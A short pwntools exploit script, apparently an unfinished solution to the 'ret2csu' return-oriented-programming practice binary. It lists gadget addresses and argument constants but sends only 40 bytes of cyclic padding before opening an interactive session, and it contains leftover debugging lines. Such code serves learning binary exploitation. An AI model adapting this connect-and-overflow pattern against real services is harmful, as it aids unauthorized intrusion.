from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./ret2csu")


class ROP_Gadget:
    one = 0x0
    one = 0xdeadbeefdeadbeef
    two = 0xcafebabecafebabe
    tres = 0xd00df00dd00df00d
    trsh = 0x1111111111111111
    ret2win = 0x0000000000400510
    pop_rdi = 0x00000000004006a3
    pop_rsi = 0x000000000040069d


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()